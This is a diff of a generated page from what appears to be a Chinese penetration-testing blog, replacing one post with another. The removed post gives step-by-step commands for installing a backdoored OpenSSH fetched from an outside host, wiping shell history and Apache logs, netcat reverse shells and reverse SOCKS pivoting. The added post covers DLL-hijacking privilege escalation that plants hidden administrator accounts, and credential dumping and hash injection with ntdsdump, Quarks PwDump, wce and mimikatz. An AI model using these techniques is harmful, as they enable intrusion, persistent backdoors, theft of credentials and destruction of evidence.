@@ -37,16 +37,16 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.4" />
 
 
-<meta name="description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
+<meta name="description" content="提权ws2help.dll(exec 权限    系统权限 联网）这个有一个局限性，就是替换的目标不多，不是所有程序都能替换的。有些有自检程序 ，有些正在运行过程，不允许修改我分享个跟这个类似的方法：程序在执行过程中很多时候会调用系统的资源但是程序编译过程是不会指定明确的系统资源路径的。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux Penetration">
-<meta property="og:url" content="sunsays.net/2015/07/20/Linux-Penetration/index.html">
+<meta property="og:title" content="NetWorking  Penetration 1">
+<meta property="og:url" content="sunsays.net/2015/07/18/NetWorking-Peneration-1/index.html">
 <meta property="og:site_name" content="SunSays">
-<meta property="og:description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
-<meta property="og:updated_time" content="2015-10-11T00:23:00.289Z">
+<meta property="og:description" content="提权ws2help.dll(exec 权限    系统权限 联网）这个有一个局限性，就是替换的目标不多，不是所有程序都能替换的。有些有自检程序 ，有些正在运行过程，不允许修改我分享个跟这个类似的方法：程序在执行过程中很多时候会调用系统的资源但是程序编译过程是不会指定明确的系统资源路径的。">
+<meta property="og:updated_time" content="2015-07-27T12:19:11.294Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux Penetration">
-<meta name="twitter:description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
+<meta name="twitter:title" content="NetWorking  Penetration 1">
+<meta name="twitter:description" content="提权ws2help.dll(exec 权限    系统权限 联网）这个有一个局限性，就是替换的目标不多，不是所有程序都能替换的。有些有自检程序 ，有些正在运行过程，不允许修改我分享个跟这个类似的方法：程序在执行过程中很多时候会调用系统的资源但是程序编译过程是不会指定明确的系统资源路径的。">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -56,7 +56,7 @@
   };
 </script>
 
-    <title> Linux Penetration // SunSays </title>
+    <title> NetWorking  Penetration 1 // SunSays </title>
 </head>
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 <!--[if lte IE 8]>
@@ -169,7 +169,7 @@
           
           
             
-              Linux Penetration
+              NetWorking  Penetration 1
             
           
         </h1>
@@ -178,8 +178,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-07-20T19:26:09+08:00" content="2015-07-20">
-            2015-07-20
+          <time itemprop="dateCreated" datetime="2015-07-18T11:02:49+08:00" content="2015-07-18">
+            2015-07-18
           </time>
         </span>
 
@@ -197,35 +197,15 @@
       
 
       
-        <span itemprop="articleBody"><p>写的不够详细，之后会分开详细讲解。<br>正向连接<br>  ssh 后门<br>老牌的SSH后门了，功能稳定<br><a id="more"></a><br>备份原文件：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.mv <span class="regexp">/etc/</span>ssh<span class="regexp">/ssh_config /</span>etc<span class="regexp">/ssh/</span>ssh_config.old</span><br><span class="line"><span class="number">2</span>.mv <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config /</span>etc<span class="regexp">/ssh/</span>sshd_config.old</span><br></pre></td></tr></table></figure></p>
-<p>3.下载并安装ssh后门：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># wget http://www.down.com/sshbd.tgz</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># tar zxvf sshbd.tgz</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># cd openssh</span></span><br></pre></td></tr></table></figure></p>
-<p>4.设置ssh后门的登录密码：<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi versio.h</span><br><span class="line">#define <span class="type">SSH_VERSION</span> <span class="string">"OpenSSH_4.2"</span> --&gt; you've <span class="keyword">to</span> edit <span class="type">OpenSSH_4</span>.<span class="number">2</span></span><br><span class="line"></span><br><span class="line">vi includes.h</span><br><span class="line">define _SECRET_PASSWD <span class="string">"123456"</span> -&gt; 后门连接密码</span><br></pre></td></tr></table></figure></p>
-<p>5.编译安装：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># ./configure --prefix=/usr --sysconfdir=/etc/ssh</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># make &amp;&amp; make install</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># cp ssh_config sshd_config /etc/ssh/</span></span><br></pre></td></tr></table></figure></p>
-<p>修改文件时间:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -r  <span class="regexp">/etc/</span>ssh<span class="regexp">/ssh_config.old /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">touch -r  <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config.old /</span>etc<span class="regexp">/ssh/</span>sshd_config</span><br></pre></td></tr></table></figure></p>
-<p>重启服务<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># /etc/init.d/sshd restart</span></span><br></pre></td></tr></table></figure></p>
-<p>6、登入后门：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="operator">-l</span> root IP</span><br><span class="line">password：<span class="number">123456</span></span><br><span class="line"><span class="built_in">echo</span> &gt;/root/.bash_<span class="built_in">history</span> //清空操作日志</span><br></pre></td></tr></table></figure></p>
-<p>7、清除apache日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=<span class="number">0</span></span><br><span class="line"><span class="built_in">cd</span> /etc/httpd/logs/</span><br><span class="line">sed -i <span class="string">'/IP/d'</span> access_<span class="built_in">log</span>*</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://gaga1.blogbus.com/logs/86451661.html" target="_blank" rel="external">http://gaga1.blogbus.com/logs/86451661.html</a><br><a href="http://drops.wooyun.org/tips/1951" target="_blank" rel="external">http://drops.wooyun.org/tips/1951</a> 乌云知识。。。<br>参考文章：<br><a href="http://zone.wooyun.org/content/5064" target="_blank" rel="external">http://zone.wooyun.org/content/5064</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>反向shell</p>
-<p>telnet shell（后门<br>    管道实现<br>udp shell    python脚本<br>    zone.wooyun.org/content/6041<br>nc（管道方式）反弹shell<br>        mkmod /tmp/backpipe p<br>        /bin/sh  0 /tmp/backpipe<br>bash shell<br>总结：<a href="https://www.91ri.org/9367.html" target="_blank" rel="external">https://www.91ri.org/9367.html</a><br>转换成 交换式shell<br>    Python -c  ‘ import pyt ; pty.spwam(“/bin/sh”) ‘</p>
-<p>不被history命令 记录     export HISTSIZE=0<br>其他入口<br>public key sshd<br>ssh的登录验证方式<br>ssh 端口转发<br>ssh user@Host2 N -f R1250::1080<br>SSH端口转发分为两种，一种是本地端口转发，又称为本地SSH隧道。一直是远程端口转发。SSH端口转发，还必须指定数据传送的目标主机，从而形成点对点的端口转发。<br>本地端口转发<br>假定有三台主机A、B、C。由于种种原因(无论是防火墙还是路由原因)，AC两台主机之间无法连通。但是B却可以和A、C连通。这时候就可以用本地端口转发来实现A和C通过B来连通。<br>    A  192.168.7.27<br>    B  192.168.6.19<br>    C  192.168.30.68</p>
-<p>6网段和7网段、30网段都相通，但是7网段和30网段不通，现在需要从7网段访问30网段的一个web服务，可以通过本地端口转发来实现。首先确保A、B的ssh服务都开启了允许转发：GatewayPorts yes、AllowTcpForwarding yes</p>
-<p>在A上面执行下面的命令：</p>
-<p>1    ssh -l test -L 192.168.7.27:59000:192.168.30.68:80 192.168.6.19<br>参数-L后面总共有四个用冒号分割的值，分别是’本地地址:本地端口:目标主机:目标主机端口’。这条命令的意思，就是指定SSH绑定本地192.168.7.27的59000端口，然后指定 192.168.6.19将所有的数据，转发到目标主机192.168.30.68的80端口。</p>
-<p>如此，我们只要在A上连接A本地地址的59000端口，就等于连上了192.168.30.68的80端口。</p>
-<p>1.curl <a href="http://192.168.7.27:59000/" target="_blank" rel="external">http://192.168.7.27:59000/</a></p>
-<p>这种本地端口转发适合于A是企业局域网机器，B、C均为广域网上的有独立公网IP的机器，但是企业的防火墙阻止了A和C直接的通讯，但是却允许A和B通讯，这样A就可以通过B和C进行通讯。<br>远程端口转发</p>
-<p>假定有三台主机A、B、C。A是企业内部局域网的机器，B是企业内部一台具即有私网IP又有公网IP的服务器(类似网关)，C是Internet上具有公网IP的服务器，A可以直接连接到C，B可以直接连接A(内网)，也可以直接连接C(公网)，但是由于A在内网，所以C不能直接连接A，但是C可以通过B连接A。<br>     A  10.1.6.234<br>     B  114.80.130.88/10.1.10.1<br>     C  119.75.218.77<br>在B上执行以下命令：<br>1    ssh -l taomee -p 58000 -R 10.1.10.1:59000:10.1.6.234:80 119.75.218.77<br>在C上执行以下命令：<br>1.curl <a href="http://10.1.6.234" target="_blank" rel="external">http://10.1.6.234</a></p>
-<p>端口重定向</p>
-<p>sock5<br>随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认web服务端口80、MSSQL数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。<br>对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。</p>
-<ol>
-<li>sSocks<br>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。<br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">http://sourceforge.net/projects/ssocks/</a><br>下载解压后，执行命令编译。<br>./configure &amp;&amp; make<br>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：<br>程序 功能<br>nsocks 类似通过Socks5代理后的netcat，可用来测试socks server<br>ssocksd 用来开启Socks5代理服务<br>ssocks 本地启用Socks5服务，并反弹到另一IP地址<br>rcsocks 接收反弹过来的Socks5服务，并转向另一端口<br>2.模拟网络环境说明<br>本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 </li>
-</ol>
-<p>3.实施Socks代理反弹<br>1)本地监听端口<br>在渗透测试端192.168.10.50执行<br>./rcsocks -l 1088 -p 1080 -vv<br>等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道 </p>
-<p>2)开启Socks5代理服务，反弹<br>在192.168.206.130上执行<br>./rssocks -vv -s 192.168.10.50:1080<br>启用Socks5服务，反弹到192.168.10.50的端口1080上</p>
-<p>此时在渗透测试端192.168.10.50可看到通道连接成功</p>
-<p>nc反弹shell<br><a href="http://www.freebuf.com/articles/system/10632.html乌云" target="_blank" rel="external">http://www.freebuf.com/articles/system/10632.html乌云</a><br>对于瑞士军刀nc我们再熟悉不过了，经常被用来进行数据包发送，文件传送以及反弹shell。在渗透测试过程中如果想反弹shell我们通常的做法是：<br>nc -l -vv -p 2222 -e /bin/bash<br>在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就<br>没办法利用了呢？天无绝人之路，来看下面的TIP。</p>
-<p>在Attack这边依然用nc -lnvp listenport监听某端口，在目标环境中依次执行以下命令：<br>root@bt:~#mknod /tmp/backpipe p<br>root@bt:~#/bin/sh 0/tmp/backpipe<br>第一条命令使用mknod在tmp目录下创建一个管道backpipe，第二条命令首先将默认shell环境的输入<br>重定向给刚才创建的管道，然后将输出通过nc attackerip<br>listenport重定向到攻击者一端，最后将shell的执行结果再重定向到管道中。</p>
-<p>网上查了下mknod命令，说是只能root用户才有权限执行，可是经过测试普通权限的用户也可以创建管道等特殊文件，如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道。</p>
+        <span itemprop="articleBody"><h2 id="提权">提权</h2><h2 id="ws2help-dll(exec_权限_系统权限_联网）">ws2help.dll(exec 权限    系统权限 联网）</h2><p>这个有一个局限性，就是替换的目标不多，不是所有程序都能替换的。有些有自检程序 ，有些正在运行过程，不允许修改<br>我分享个跟这个类似的方法：<br>程序在执行过程中很多时候会调用系统的资源<br>但是程序编译过程是不会指定明确的系统资源路径的。<br><a id="more"></a><br>比如联网的程序 启动的时候 需要加载系统目录下的 ws2help.dll。<br>但是程序加载的时候并不知道这个dll的位置，<br>他启动的顺序是先搜索本目录，然后搜索系统目录，<br>最后在系统目录找到这个 ws2help.dll<br>你只需要编译个你需要的功能的dll 改名字成 ws2help.dll 放进需要网络应用的程序根目录里面，<br>管理员或者其他服务，去启动这个程序的时候，就会加载。<br>之前有篇文章说，利用替换搜狗的自动升级策程序运行鸽子，跟这个也是差不多的道理啊！<br>使用方法： 将此文件放入需要网络应用的程序根目录里，程序启动的时候会加载此文件，自动创建系统管理员用户 wlozz 密码为 wlozz<br>修改用户密码将此文件载入 c32，搜索字符串 wlozz 自行修改</p>
+<h2 id="lpk-dll_提权_（_高权限用户运行）">lpk.dll  提权  （ 高权限用户运行）</h2><p>将此DLL文件放入服务器存在EXE的目录中，重启后（可以攻击导致重启，其他方法也行，就是让系统再次运行此目录的任何一个EXE就行）<br>比如放在c:\php\目录下，下次重启后就会在服务器中添加用户bmd,密码为cunzhang的管理员帐号<br>(网上已经存在了，不过没有测试成功，此款测试成功，大家可以自己测试附件压缩包为测试用的EXE，点击TEST.EXE，然后关闭就会添加用户BMD，也可以在同目录运行其他EXE测试)<br>也有人说这东西08年的时候就被玩烂了。微软10年10月出了补丁，如果这个能用，还不如用pr<br>————————————————————————————<br>这个要比最近爆出来的usp10.dll提权感觉还要牛x点。<br>程序执行会到系统目录找到lpk.dll加载<br>按照xx的顺序 程序当前目录优先加载<br>于是把这个lpk.dll放到exe的程序目录<br>exe运行的时候我们这个lpk.dll就会被加载<br>提权的时候找一个系统权限下启动的exe程序的目录<br>把这个lpk.dll丢到里面就行<br>然后当exe执行的时候这个lpk就会被加载来添加一个用户</p>
+<p>测试方法：<br>将lpk.dll放到任意目录<br>执行当前目录里的任意exe(最好是第三方程序)<br>系统就会添加一个账号<br>装了360的机器可能测试失败<br>本来打算多方面考虑一下发一个完全版的<br>比如寻找系统用户组什么的<br>防止被人说卖关子<br>虽然不成熟也丢出来<br>这样就只能默认administrators管理组了<br>反正当前的功能就是添加一个用户名为3est的用户并将这个用户添加到administrators组<br>为了方便大家记忆<br>被加载后添加的用户名密码分别是<br>user：3est<br>pass：m0r5Mjj$</p>
+<h2 id="get_hash">get hash</h2><h2 id="1-_dump_ntds-dit_附件内NTDSDump-exe是导出工具，其命令行如下：">1.    dump ntds.dit  附件内NTDSDump.exe是导出工具，其命令行如下：</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">2.	</span>ntdsdump.exe <span class="xml"><span class="tag">&lt;<span class="title">-f</span> <span class="attribute">ntds.dit</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="title">-k</span> <span class="attribute">HEX-SYS-KEY</span> | <span class="attribute">-s</span> <span class="attribute">system.hiv</span>&gt;</span></span> [-o out.txt] [-h] [-t JOHN|LC]</span><br><span class="line"><span class="bullet">3.	</span>-f    ntds.dit路径</span><br><span class="line"><span class="bullet">4.	</span>-k   可选的十六进制格式的SYSKEY</span><br><span class="line"><span class="bullet">5.	</span>-s    可选的system.hiv路径</span><br><span class="line"><span class="bullet">6.	</span>-h   导出历史密码记录</span><br><span class="line"><span class="bullet">7.	</span>-t    导出格式，LC或JOHN</span><br><span class="line"><span class="bullet">8.	</span>-o   导出到指定文件</span><br></pre></td></tr></table></figure>
+<h2 id="2-2-_Quarks_PwDump">2.2. Quarks PwDump</h2><p>是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。<br>作者开发这个工具的原因是现在没有一款工具能同时抓取所有类型的hash和Bitlocker信息。这个工具没有注入任何进程，工作原理是神马呢，源代码值得读一下。<br>它目前可以导出 :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">– Local accounts NT/LM hashes + <span class="built_in">history</span> 本机NT/LM哈希+历史登录记录</span><br><span class="line">– Domain accounts NT/LM hashes + <span class="built_in">history</span> 域中的NT/LM哈希+历史登录记录</span><br><span class="line">– Cached domain password 缓存中的域管理密码</span><br><span class="line">– Bitlocker recovery information (recovery passwords &amp; key packages) 使用Bitlocker的恢复后遗留的信息</span><br></pre></td></tr></table></figure></p>
+<p>支持的操作系统 :<code>XP/2003/Vista/7/2008/8</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1 / USAGE</span><br><span class="line">=========</span><br><span class="line">Here it is how you can <span class="operator"><span class="keyword">use</span> Quarks PWDump:</span><br><span class="line">quarks-pwdump.exe&lt;<span class="keyword">option</span>(s)&gt;</span><br><span class="line">Options :</span><br><span class="line">–dump-hash-<span class="keyword">local</span></span><br><span class="line">–dump-hash-<span class="keyword">domain</span>-cached</span><br><span class="line">–dump-hash-<span class="keyword">domain</span> (NTDS_FILE must be specified)</span><br><span class="line">–dump-bitlocker (NTDS_FILE must be specified)</span><br><span class="line">–<span class="keyword">with</span>-history (optional)</span><br><span class="line">–<span class="keyword">output</span>-type JOHN/LC (optional, <span class="keyword">if</span> <span class="keyword">no</span>=&gt;JOHN)</span><br><span class="line">–<span class="keyword">output</span> FILE (optional, <span class="keyword">if</span> <span class="keyword">no</span>=&gt;stdout)</span><br><span class="line">Dump options must be <span class="keyword">user</span> <span class="keyword">all</span> <span class="keyword">at</span> once.</span><br><span class="line"><span class="keyword">In</span> <span class="keyword">all</span> cases, the tool must be executed <span class="keyword">on</span> the targeted operating system.</span><br><span class="line"><span class="keyword">Some</span> command examples:</span><br><span class="line">– Dump <span class="keyword">domain</span> hashes <span class="keyword">from</span> NTDS.dit <span class="keyword">with</span> its history</span><br><span class="line">#quarks-pwdump.exe –dump-hash-<span class="keyword">domain</span> –<span class="keyword">with</span>-history</span><br><span class="line">– Dump <span class="keyword">local</span> account hashes <span class="keyword">to</span> LC <span class="keyword">format</span></span><br><span class="line">#quarks-pwdump.exe –dump-hash-<span class="keyword">local</span> –<span class="keyword">output</span>-type LC</span><br><span class="line">– Dump <span class="keyword">domain</span> hashes <span class="keyword">from</span> NTDS.dit <span class="keyword">with</span> its history</span><br><span class="line">#quarks-pwdump.exe –dump-bitlocker –<span class="keyword">output</span> c:bitlocker.txt c:ntds.dit</span><br><span class="line"><span class="keyword">All</span> features require administrator <span class="keyword">privileges</span>.</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="3-_wce">3. wce</h2><p>是与gethashes 和mimikatz齐名的一款hash管理工具, ce的使用说明如下<br>参数解释:<br>-l          列出登录的会话和NTLM凭据（默认值）<br>-s               修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:<lm哈希>:<nt哈希><br>-r                不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次<br>-c               用一个特殊的NTML凭据运行一个新的会话 参数：<cmd><br>-e               不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次<br>-o               保存所有的输出到一个文件 参数:&lt;文件名&gt;<br>-i                指定一个LUID代替使用当前登录会话 参数:<luid><br>-d               从登录会话中删除NTLM凭据 参数:<luid><br>-a               使用地址 参数: &lt;地址&gt;<br>-f                强制使用安全模式<br>-g               生成LM和NT的哈希 参数&lt;密码&gt;<br>-K               缓存kerberos票据到一个文件（unix和windows wce格式）<br>-k               从一个文件中读取kerberos票据并插入到windows缓存中<br>-w              通过摘要式认证缓存一个明文的密码<br>-v               详细输出<br>在上面的使用说明中可以看到，-s参数可以用来hash注入。<br>hash注入的原理是将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程lsass.exe中去，使得本地在使用ipc登录目标机器的时候就如同自己登录自己的机器一样获得权限。至于目标机器的本地或者是域用户hash如何取得那就要发挥你自己的想象力了。hash注入本身是为了对付那些破解不了的NTHASH。<br>具体的命令格式如下：<br>wce.exe -s 用户名:对方机器名或者ip:LM-HASH:NT-HASH<br>当提示注入成功的时候，这时候键入net use命令并没有看到有连接，其实已经可以连接了，直接使用ipc命令操作对方的机器就可以了，如上图。</luid></luid></cmd></nt哈希></lm哈希></p>
+<p>其次域里的域用户hash也可以使用wce进行注入，只需要把命令格式变一变就行<br>wce.exe -s 用户名:域名:LM-HASH:NT-HASH<br>同样的方法不再赘述。</p>
+<h2 id="4-_mimikatz">4. mimikatz</h2><p>2.0版本的只需要两条命令就可以了，比以前版本的更简单了。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一条：privilege::debug</span><br><span class="line">                <span class="comment">//提升权限</span></span><br><span class="line">第二条：sekurlsa::logonpasswords</span><br><span class="line">              <span class="comment">//抓取密码</span></span><br></pre></td></tr></table></figure></p>
 </span>
       
     </div>
@@ -243,13 +223,13 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/07/23/堆栈攻击概要/" rel="prev">堆栈攻击概要</a>
+              <a href="/2015/07/18/group/" rel="prev">group</a>
             
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/07/18/group/" rel="next">group</a>
+              <a href="/2015/07/17/NetWorking-Penetration/" rel="next">NetWorking Penetration</a>
             
           </div>
         </div>
@@ -412,7 +392,7 @@
           <div class="post-toc">
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ws2help-dll(exec_权限_系统权限_联网）"><span class="nav-number">2.</span> <span class="nav-text">ws2help.dll(exec 权限    系统权限 联网）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lpk-dll_提权_（_高权限用户运行）"><span class="nav-number">3.</span> <span class="nav-text">lpk.dll  提权  （ 高权限用户运行）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get_hash"><span class="nav-number">4.</span> <span class="nav-text">get hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-_dump_ntds-dit_附件内NTDSDump-exe是导出工具，其命令行如下："><span class="nav-number">5.</span> <span class="nav-text">1.    dump ntds.dit  附件内NTDSDump.exe是导出工具，其命令行如下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-_Quarks_PwDump"><span class="nav-number">6.</span> <span class="nav-text">2.2. Quarks PwDump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-_wce"><span class="nav-number">7.</span> <span class="nav-text">3. wce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-_mimikatz"><span class="nav-number">8.</span> <span class="nav-text">4. mimikatz</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
